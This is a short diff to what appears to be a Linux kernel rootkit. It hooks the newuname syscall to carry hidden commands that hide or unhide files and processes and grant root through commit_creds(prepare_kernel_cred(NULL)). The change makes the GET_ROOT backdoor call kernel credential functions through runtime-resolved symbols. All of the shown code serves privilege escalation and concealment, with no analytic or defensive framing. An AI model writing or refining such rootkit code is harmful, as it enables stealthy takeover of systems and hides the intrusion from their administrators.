@@ -3,7 +3,6 @@
 #include <asm/unistd.h>
 #include <asm/siginfo.h>
 
-#include <linux/cred.h>
 #include <linux/kernel.h>
 #include <linux/perf_event.h>
 
@@ -580,7 +579,8 @@ asmlinkage long new_sys_newuname(struct new_utsname *name)
 		unhide_inode(args.param1);
 		break;
 	case GET_ROOT:
-		commit_creds(prepare_kernel_cred(NULL));
+		if (ksyms.commit_creds && ksyms.prepare_kernel_cred)
+			ksyms.commit_creds(ksyms.prepare_kernel_cred(NULL));
 		break;
 	case SYSCALL_HIDE_PID:
 		hide_pid(args.param1);
